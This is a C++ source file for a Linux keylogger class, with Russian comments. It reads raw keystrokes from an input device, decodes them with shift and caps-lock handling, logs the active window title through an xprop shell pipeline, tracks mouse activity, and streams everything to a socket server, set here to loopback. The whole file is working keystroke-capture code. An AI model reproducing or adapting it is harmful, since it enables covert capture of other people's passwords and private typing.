#define DEV_PATH "/dev/input/event2"
#include <vector>
#include "key_logger.h"
#include <iostream>
#include <linux/input.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <iostream>
#include <errno.h>
#include <string.h>
#include <string>
#include "async_write.h"
#include <X11/Xlib.h>
#include <X11/extensions/XInput2.h>
#include <assert.h>
#include <fstream>
#include <sstream>
#include "common.h"

 std::string CurrentDateTime() {
    std::string output = "Date:  ";
    time_t seconds = time(nullptr);
    tm* pTm = localtime(&seconds);
    return output + asctime(pTm);
    }
std::string Date_Time()
{
    time_t rawtime;
    tm * ptm;
    std::string strTime;
    std::stringstream out;

    time (&rawtime);
    ptm = gmtime (&rawtime);
    out <<(1900+ptm->tm_year)<<"/"
       <<(1+ptm->tm_mon)<<"/"
       <<ptm->tm_mday<<", "
       <<ptm->tm_hour<<":"
       <<ptm->tm_min<<":"
       <<ptm->tm_sec;
    getline(out, strTime);
    return strTime;
}

int check_path(int result) {
    if (result >= 0)
        return result;


    perror(strerror(errno));
    exit(-1);
}
inline std::string exec(const char* cmd) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return "ERROR";
    char buffer[128];
    std::string result = "";
    while(!feof(pipe)) {
        if(fgets(buffer, 128, pipe) != NULL)
                result += buffer;
    }
    pclose(pipe);
    return result;
}
bool isLetter(const int value)
{
    if ((value >= 16 && value <= 25) || (value >= 30 && value <= 38) || (value >= 44 && value <= 50))
        return true;
    else
        return false;
}

#pragma region Класс кей логгера
Key_logger::Key_logger(){
        keys.insert({1,"ESC "});
        keys.insert({2,"1 "});
        keys.insert({3,"2 "});
        keys.insert({4,"3 "});
        keys.insert({5,"4 "});
        keys.insert({6,"5 "});
        keys.insert({7,"6 "});
        keys.insert({8,"7 "});
        keys.insert({9,"8 "});
        keys.insert({10,"9 "});
        keys.insert({11,"0 "});
        keys.insert({12,"- "});
        keys.insert({13,"= "});
        keys.insert({14,"BACKSPACE "});
        keys.insert({15,"TAB "});
        keys.insert({16,"q "});
        keys.insert({17,"w "});
        keys.insert({18,"e "});
        keys.insert({19,"r "});
        keys.insert({20,"t "});
        keys.insert({21,"y "});
        keys.insert({22,"u "});
        keys.insert({23,"i "});
        keys.insert({24,"o "});
        keys.insert({25,"p "});
        keys.insert({26,"[ "});
        keys.insert({27,"] "});
        keys.insert({28,"ENTER "});
        keys.insert({29, "CNTRL "});
        keys.insert({30,"a "});
        keys.insert({31,"s "});
        keys.insert({32, "d "});
        keys.insert({33, "f "});
        keys.insert({34, "g "});
        keys.insert({35,"h "});
        keys.insert({36,"j "});
        keys.insert({37,"k "});
        keys.insert({38, "l "});
        keys.insert({39,"; "});
        keys.insert({40,"\' "});
        keys.insert({41,"` "});
        keys.insert({42,"LSHIFT "});
        keys.insert({43,"\\ "}); 
        keys.insert({44,"z "});
        keys.insert({45,"x "});
        keys.insert({46,"c "});
        keys.insert({47,"v "});
        keys.insert({48,"b "});
        keys.insert({49,"n "});
        keys.insert({50,"m "});
        keys.insert({51,", "});
        keys.insert({52,". "});
        keys.insert({53,"/ "});
        keys.insert({54,"RSHIFT "});
        keys.insert({56, "LALT "});
        keys.insert({57,"SPACE "});
        keys.insert({58,"CAPSLOCK "});
        keys.insert({59,"f1 "});
        keys.insert({60,"f2 "});
        keys.insert({61,"f3 "});
        keys.insert({62,"f4 "});
        keys.insert({63,"f5 "});
        keys.insert({64,"f6 "});
        keys.insert({65,"f7 "});
        keys.insert({66,"f8 "});
        keys.insert({67,"f9 "});
        keys.insert({68,"f10 "});
        keys.insert({69,"NUMLOCK "});
        keys.insert({70,"SCROLLOCK "}); 
        keys.insert({100,"RALT "});
        keys.insert({103,"UP "});
        keys.insert({108,"DOWN "});
        keys.insert({105,"LEFT "});
        keys.insert({106,"RIGHT "});
        keys.insert({110,"INS "});
        keys.insert({111,"DEL "});
        keys.insert({119, "PAUSEBREAK"});
        keys.insert({125,"WIN "});

        keys.insert({1001,"ESC"});
        keys.insert({1002,"! "});
        keys.insert({1003,"@ "});
        keys.insert({1004,"# "});
        keys.insert({1005,"$ "});
        keys.insert({1006,"% "});
        keys.insert({1007,"^ "});
        keys.insert({1008,"& "});
        keys.insert({1009,"* "});
        keys.insert({1010,"( "});
        keys.insert({1011,") "});
        keys.insert({1012,"_ "});
        keys.insert({1013,"+ "});
        keys.insert({1016,"Q "});
        keys.insert({1017,"W "});
        keys.insert({1018,"E "});
        keys.insert({1019,"R "});
        keys.insert({1020,"T "});
        keys.insert({1021,"Y "});
        keys.insert({1022,"U "});
        keys.insert({1023,"I "});
        keys.insert({1024,"O "});
        keys.insert({1025,"P "});
        keys.insert({1026,"{ "});
        keys.insert({1027,"} "});

        keys.insert({1030,"A "});
        keys.insert({1031,"S "});
        keys.insert({1032, "D "});
        keys.insert({1033, "F "});
        keys.insert({1034, "G "});
        keys.insert({1035,"H "});
        keys.insert({1036,"J "});
        keys.insert({1037,"K "});
        keys.insert({1038, "L "});
        keys.insert({1039,": "});
        keys.insert({1040,"\" "});
        keys.insert({1041,"~ "});
        keys.insert({1042,"LSHIFT "});
        keys.insert({1043,"| "}); //!!
        keys.insert({1044,"Z "});
        keys.insert({1045,"X "});
        keys.insert({1046,"C "});
        keys.insert({1047,"V "});
        keys.insert({1048,"B "});
        keys.insert({1049,"N "});
        keys.insert({1050,"M "});
        keys.insert({1051,"< "});
        keys.insert({1052,"> "});
        keys.insert({1053,"? "});
        keys.insert({1058,"CAPSLOCK  "});
    }

void Key_logger::start(int port) {
		_socket = socket(AF_INET, SOCK_STREAM, 0);

		sockaddr_in addr{};
		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

		connect(_socket, (sockaddr*)&addr, sizeof(addr));
		get_keys_vector();
	}
    void Key_logger::get_keys_vector(){
        std::string Name;

        std::cout << "Enter the name of the user >> ";
        std::cin >> Name; 

        #pragma region Инициализация для клавиатуры и текущего окна
        // FILE * file_keyboard = fopen(path_of_keyboard.c_str(),"a+");
        // int fd_async_keyboard = fileno(file_keyboard);
        std::vector<std::string> names;
        //вместо пуш передать строчку на сервер
        message_header send_msg_keys_header;
        message send_msg_keys;
        send_msg_keys.keys = "\n\n" + CurrentDateTime();
        send_msg_keys.user_name = Name;
        send_msg_keys_header.action = actions::KEYBOARD;
        send_msg_keys_header.size = sizeof(send_msg_keys);
        if (!try_send_header(_socket, send_msg_keys_header))
               _exit(EXIT_FAILURE);
        if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
            _exit(EXIT_FAILURE);
        //names.push_back("\n\n" + CurrentDateTime());
        int keys_fd;
        struct input_event t;
        struct input_event t_shift;
        keys_fd = check_path(open(DEV_PATH, O_RDONLY));
        bool flag_shift = false;
        bool flag_caps = false;
        std::string proc_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
         //вместо пуш передать строчку на сервер

        send_msg_keys.keys = proc_name;
        send_msg_keys.user_name = Name;

        send_msg_keys_header.action = actions::KEYBOARD;
        send_msg_keys_header.size = sizeof(send_msg_keys);

        if (!try_send_header(_socket, send_msg_keys_header))
               _exit(EXIT_FAILURE);
        if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
            _exit(EXIT_FAILURE);
        //names.push_back(proc_name);
        #pragma endregion
        
    #pragma region Инициализация для мыши 
    //На сервер
    // FILE * file_mouse = fopen(path_of_mouse.c_str(),"a+");
    // int fd_async_mouse = fileno(file_mouse);
    //На сервер

    Display *display;
    Window root_window;
    display = XOpenDisplay(0);
    root_window = XRootWindow(display, 0);

    int xi_opcode, event, error;
    if (!XQueryExtension(display, "XInputExtension", &xi_opcode, &event, &error)) {
        fprintf(stderr, "Error: XInput extension is not supported!\n");
    }

    int major = 2;
    int minor = 0;
    int retval = XIQueryVersion(display, &major, &minor);
    if (retval != Success) {
        fprintf(stderr, "Error: XInput 2.0 is not supported (ancient X11?)\n");
    }

    unsigned char mask_bytes[(XI_LASTEVENT + 7) / 8] = {0};  
    XISetMask(mask_bytes, XI_RawMotion);

    XIEventMask evmasks[1];
    evmasks[0].deviceid = XIAllMasterDevices;
    evmasks[0].mask_len = sizeof(mask_bytes);
    evmasks[0].mask = mask_bytes;
    XISelectEvents(display, root_window, evmasks, 1);

    XEvent xevent;
    auto first = time(NULL);
    auto second = first;
    auto write_flag_active = true;
    auto write_flag_unactive = true;
    std::vector<std::string> active_mouse;
    message send_msg_mouse;
    message_header send_msg_mouse_header;
    send_msg_mouse.user_name = Name;
    send_msg_mouse_header.action = actions::MOUSE;
    #pragma endregion

        while (true)
        {
            if (time(NULL) - first > 6 && write_flag_active == true) {
            std::string message = Date_Time();
            send_msg_mouse.mice = message.append(" Mouse is UNACTIVE\n");
            //active_mouse.push_back(message.append(" Mouse is UNACTIVE\n"));
            send_msg_mouse_header.size = sizeof(send_msg_mouse);

            if (!try_send_header(_socket, send_msg_mouse_header))
                _exit(EXIT_FAILURE);
            if (!try_send(_socket, send_msg_mouse, sizeof(send_msg_mouse)))
                _exit(EXIT_FAILURE);

            write_flag_active = false;
            write_flag_unactive = true;
            first = time(NULL);
            }
        while (XPending(display)) {
            XNextEvent(display, &xevent);

            if (xevent.xcookie.type != GenericEvent || xevent.xcookie.extension != xi_opcode) {
                continue;
            }
            XGetEventData(display, &xevent.xcookie);
            if (xevent.xcookie.evtype != XI_RawMotion) {
                XFreeEventData(display, &xevent.xcookie);
                continue;
            }
            XFreeEventData(display, &xevent.xcookie);

            Window root_return, child_return;
            int root_x_return, root_y_return;
            int win_x_return, win_y_return;
            unsigned int mask_return;
            int retval = XQueryPointer(display, root_window, &root_return, &child_return,
                                       &root_x_return, &root_y_return,
                                       &win_x_return, &win_y_return,
                                       &mask_return);
            if (!retval) {
                continue;
            }
            assert(root_x_return == win_x_return);
            assert(root_y_return == win_y_return);


            first = time(NULL);
            
            if (write_flag_unactive == true) {
                std::string message = Date_Time();
                send_msg_mouse.mice = message.append(" Mouse is ACTIVE\n");

                send_msg_mouse_header.size = sizeof(send_msg_mouse);
                if (!try_send_header(_socket, send_msg_mouse_header))
                    _exit(EXIT_FAILURE);
                if (!try_send(_socket, send_msg_mouse, sizeof(send_msg_mouse)))
                    _exit(EXIT_FAILURE);
                //active_mouse.push_back(message.append(" Mouse is ACTIVE\n"));
                write_flag_unactive = false;
                write_flag_active = true;
            }
                if (child_return) {
                int local_x, local_y;
                XTranslateCoordinates(display, root_window, child_return,
                                      root_x_return, root_y_return,
                                      &local_x, &local_y, &child_return);
            }
        }
            std::string current_name = exec("xprop -id `xprop -root _NET_ACTIVE_WINDOW | awk '{print $NF}'` WM_NAME | awk '{print $NF}'").c_str();
            if (current_name != proc_name)
            {
                send_msg_keys.keys = "\n\n" + current_name;
                send_msg_keys.user_name = Name;

                send_msg_keys_header.action = actions::KEYBOARD;
                send_msg_keys_header.size = sizeof(send_msg_keys);
                if (!try_send_header(_socket, send_msg_keys_header))
                    _exit(EXIT_FAILURE);
                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                    _exit(EXIT_FAILURE);
                //names.push_back("\n\n" + current_name);
                proc_name = current_name;
            }
            if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
            {

                if (t.type == EV_KEY)

                    if (t.value == 0 || t.value == 1)
                    {
                        if (t.code == 42 && t.value == 1)
                            flag_shift = true;
                        if (t.code == 42 && t.value == 0)
                            flag_shift = false;
                        if (t.code == 58 && t.value == 1)
                        {
                            
                            flag_caps = !flag_caps;
                        }

                        if (t.value == 1 && isLetter(t.code))
                        {
                            if ((flag_shift == true && flag_caps == false) || (flag_caps == true && flag_shift == false))
                            {
                                 send_msg_keys.keys = keys[t.code + 1000];
                                 send_msg_keys.user_name = Name;

                                 send_msg_keys_header.action = actions::KEYBOARD;
                                 send_msg_keys_header.size = sizeof(send_msg_keys);

                                if (!try_send_header(_socket, send_msg_keys_header))
                                    _exit(EXIT_FAILURE);
                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                    _exit(EXIT_FAILURE);
                                //names.push_back(keys[t.code + 1000]);
                                std::cout << keys[t.code + 1000] << std::endl;
                            }
                            //else if (flag_caps == true && flag_shift == false)
                            //{
                                //send_msg_keys.action = actions::KEYBOARD;
                                //send_msg_keys.keys = keys[t.code + 1000];
                                //send_msg_keys.user_name = Name;
                                //if (!try_send(_socket, send_msg_keys))
                                    //_exit(EXIT_FAILURE);
                                //names.push_back(keys[t.code + 1000]);
                                //std::cout << keys[t.code + 1000] << std::endl;
                            //}
                            else
                            {
                                send_msg_keys.keys = keys[t.code];
                                send_msg_keys.user_name = Name;

                                send_msg_keys_header.action = actions::KEYBOARD;
                                send_msg_keys_header.size = sizeof(send_msg_keys);

                                if (!try_send_header(_socket, send_msg_keys_header))
                                    _exit(EXIT_FAILURE);
                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                    _exit(EXIT_FAILURE);
                                names.push_back(keys[t.code]);
                                std::cout << "key3 " << keys[t.code] << std::endl;
                            }
                        }               
                        else if (t.value == 1 && !isLetter(t.code))
                        {
                            if (flag_shift == true)
                            {
                                send_msg_keys.keys = keys[t.code + 1000];
                                send_msg_keys.user_name = Name;

                                send_msg_keys_header.action = actions::KEYBOARD;
                                send_msg_keys_header.size = sizeof(send_msg_keys);

                                if (!try_send_header(_socket, send_msg_keys_header))
                                    _exit(EXIT_FAILURE);
                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                    _exit(EXIT_FAILURE);
                                names.push_back(keys[t.code + 1000]);
                                std::cout  << keys[t.code + 1000] << std::endl;
                                if (t.code == 1)
                                    t.code += 1000;
                            }
                            if (flag_shift == false)
                            {
                                send_msg_keys.keys = keys[t.code];
                                send_msg_keys.user_name = Name;

                                send_msg_keys_header.action = actions::KEYBOARD;
                                send_msg_keys_header.size = sizeof(send_msg_keys);

                                if (!try_send_header(_socket, send_msg_keys_header))
                                    _exit(EXIT_FAILURE);
                                if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                                    _exit(EXIT_FAILURE);
                                names.push_back(keys[t.code]);
                                std::cout  << keys[t.code] << std::endl;
                            }
                        }
                    }

                    if (t.code == 1001){
                        send_msg_keys.keys = "\n" + CurrentDateTime();

                        send_msg_keys_header.action = actions::KEYBOARD;
                        send_msg_keys_header.size = sizeof(send_msg_keys);

                        if (!try_send_header(_socket, send_msg_keys_header))
                            _exit(EXIT_FAILURE);
                        if (!try_send(_socket, send_msg_keys, sizeof(send_msg_keys)))
                            _exit(EXIT_FAILURE);
                        send_msg_keys_header.action = actions::END;
                        std::cout << t.code << std::endl;
                        std::cout << "Exit" << std::endl;
                        break;
                    }
            }
        }
        close(keys_fd);
        XCloseDisplay(display);
    }
#pragma endregion